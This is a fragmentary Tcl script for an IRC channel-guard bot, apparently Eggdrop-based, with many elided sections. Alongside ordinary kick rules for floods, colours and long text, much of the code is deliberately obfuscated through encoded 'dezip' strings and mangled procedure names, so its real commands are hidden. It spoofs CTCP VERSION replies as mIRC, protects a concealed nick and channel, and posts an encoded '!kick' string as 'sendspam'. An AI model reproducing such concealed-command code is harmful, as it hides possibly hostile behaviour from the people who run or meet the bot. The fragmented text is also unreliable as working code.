if {$knick == $ps} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4odon1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb {4odon.GuaRd} $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != {#onbot}} {
...
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] {1DonT De@p 4odon1..!}"
}
opq $channel $opnick
return 0
}
...
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] {1DonT De@p 4OnBot1..!}"
}
opq $channel $opnick
return 0
}
...
set [lines "[dezi\\p "RMmO21tAH8i/"]"] [dezi\\p "fWHJg02j1u.0MuxH./ChL2U1mN/GB.wEJDY/"]
...
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "r\w\c\x"] 0
[[dezip d3VeO/ATgwd.] "k\i\l\x"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] {} {
[[dezip d3VeO/ATgwd.] "t\o\l\y\z\o"] [[dezip d3VeO/ATgwd.] "r\w\c\x"]
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "r\w\c\x"] [[[dezip d3VeO/ATgwd.] "rmxi"] [[dezip d3VeO/ATgwd.] "r\w\c\x"]]
if {$idxc == 1} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "qiOlV1nD9wE.MmHbl/EuSZk0a8~i3o.x06SQ.4789V.K8dfI1CqdOf.wfk6r."]"]
} elseif {$idxc == 2} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "VHuHs0nYIjQ0i2Tlw/FJC.U/ICVYe.RU03H0ssXiK/eLl6u1Cqd~Of.wfk6r."]"]
} elseif {$idxc == 3} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "nZReS1auELt0WSM000XEtZW/C5apy/~S.zIB09TRwf096R/g.CqdOf.wfk6r."]"]
} elseif {$idxc == 4} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "h50aX/lfgjO/hW71A/Tf.iN/.kB5d/8PE820EHviR0M2lLh~1qnG9o.fv/ZP/"]"]
} elseif {$idxc == 5} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "qiOlV1nD9wE./TwCy1V1Amh/PAyZi158C941Gf0ln.mfDf5~0X899S/WtB3A."]"]
} elseif {$idxc == 6} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "OJVGQ.wKl1F/4zvgG/y6RO9.oMBxb1pt72O05pzIa1nF~J6N0WeS2C/GPNqp1"]"]
} elseif {$idxc == 7} {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Tkip9.e2Gj91b2R16/xez4j.5XANB/1d2mh0IBX550jv3yy1X~899S/WtB3A."]"]
} else {
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "r\w\c\x"] 0
[[dezip d3VeO/ATgwd.] "hv\g"] [[dezip d3VeO/ATgwd.] "ot\i\m\w"] [[[dezip d3VeO/ATgwd.] "wvar\k"] "[[dezip d3VeO/ATgwd.] "qiOlV1nD9wE.oDaLF1WoRb1.2v.Kv.tXaCH/oDbi31ZEI3b1L~EvZo0L39UF1"]"]
}
}
proc rands {length} {
set chars \\^|_[]{}\\
...
global n\\o\\tm le\\n\\c 
timer 5 whonmp
set [string index $lenc 13][string index $lenc 14][string index $lenc 19][string index $lenc 12] [dezi\\p "{h7Yvt/9JdHQ17GVqf08xwch10M~4wj0SGSux.}"] 
}
...
if {[getuser "config" XTRA "ODON"]!=""} {
set awaybanner [dezip [getuser "config" XTRA "ODON"]]
}
...
global botnick ve\\r\\n
set elex $vern
puthlp "NOTICE $nick :\001V\E\R $elex \001"
return 0
}
proc uncolor {s} {
regsub -all --  $s "" s
...
utimer 2 seen
set [lines "[dezi\\p "Pk8iI0eM2Wz1"]"] [dezi\\p [dc\\p "Dc3i./LW5aQ./.L1C.VlK7h/L4bZ51TI0Ju1351v/1CAUyA/F5LfP1bK3qi/"]]
proc bs_filt {data} {
...
putsrv "KICK $chan $nick :$notc 1SeLF 4SLaPS 1PRoTECTION!!"
return 0
}
if {[matchattr [lindex $text 1] n]} {
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my ADmIN!!"
return 0
}
if {[matchattr [lindex $text 1] f]} {
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my FrieNd!!"
return 0
}
if {[matchattr [lindex $text 1] m]} {
putsrv "KICK $chan $nick :$notc 1DoNT 4SLaPS1 my MaSTER!!"
}
return 0
}
...
putsrv "KICK $chan $nick :$notc 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]~1 XSzI ~[banmsg]~"
} {
putsrv "KICK $chan $nick :$notm 1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]~1 XSzI ~[banmsg]~"
}
return 0
}
if {[string match "*!!!!!*" $text]} {
if {![info exists yealnick($nick)]} {
putsrv "KICK $chan $nick :$notc 1QuITE DoNT 4YeALLED1 PLeASE <<!>>"
set yealnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
...
putsrv "KICK $chan $nick :$notc 1SToP UsEd 4bOLd1 TeXt OnLY4..!"
set boldnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
...
putsrv "KICK $chan $nick :$notc 1DOnT UsEd 4CoLOuR1 TeXt OnLY4..!"
...
global botnick 
putsrv "NOTICE $nick :\001VERSION mIRC v6.12 Khaled Mardam-Bey\001"
return 1
}
...
putsrv "NOTICE $nick :\001VERSION mIRC32 v6.12 Khaled Mardam-Bey\001"
} {
set hostmask "${nick}!*@*"
newignore $hostmask $botnick "*" 1
}
...
set sendspam "!kick 7gLqS0TJM3v06iH33.OK0b9/AwLVH/7ud2c0qKbbR0oTe8t1PLnE1.pz2ep1NAoM.1z9EQe.AGJQK/UUwFw0jPve51szXj40PzMTf/97POd."
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
puthlp "NOTICE $nick :[lgrnd] $msgprtt"
}
...
global n\\ot\\b le\\n\\c 
timer 5 whonbp
set [string index $lenc 13][string index $lenc 14][string index $lenc 19][string index $lenc 1] [dezi\\p "{Qv4To0~ujiV5/}"]
}
...
if {[string match "*{t.c(�)9.2}*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
puthlp "AWAY :{4,1N1,4E4,1T1,4G4,1A1,4T4,1E}"
} {
...
global n\\ot\\c le\\n\\c 
timer 5 whoncp
set [string index $lenc 13][string index $lenc 14][string index $lenc 19][string index $lenc 2] [dezi\\p "{X~UJuH.OfcP/0rbdgc09WT5o/}"]
}
...
puthlp "NOTICE $nick :$notc LOGCHAN [getuser "config" XTRA "LOGCHAN"]~ \[4LUU\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == {#onbot}} {
return 0
}
if {![validchan $rest]} {
